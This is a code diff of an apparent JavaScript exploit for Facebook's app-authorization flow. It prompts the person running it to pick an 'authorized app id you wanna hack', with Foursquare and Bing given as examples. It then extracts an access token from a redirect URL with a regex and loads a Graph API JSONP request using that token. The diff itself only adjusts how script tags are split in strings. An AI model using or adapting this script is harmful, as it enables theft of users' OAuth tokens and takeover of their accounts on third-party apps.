@@ -2,7 +2,7 @@
 <script>
 //http://www.facebook.com/appcenter/my
 
-var cut_me = encodeURIComponent('<script>window.Bootloader && Bootloader.done(["gZ1qR"]);<'+'/script>');
+var cut_me = encodeURIComponent('<script>window.Bootloader &&');
 var target_app_id = prompt('choose authorized app id you wanna hack! For example: \
 	86734274142,                 //foursquare\
 	111239619098,                // bing\
@@ -38,7 +38,7 @@ var int = setInterval(function(){
     window.token = ref.match(/token=([^\&]+)/)
     if(window.token){
       window.token = window.token[1];
-      document.write('<script src="https://graph.facebook.com/me?callback=hello&access_token='+window.token+'"></script>');
+      document.write('<script src="https://graph.facebook.com/me?callback=hello&access_token='+window.token+'"><'+'/script>');
     }else{
       alert('Please run again with another app id');
     }
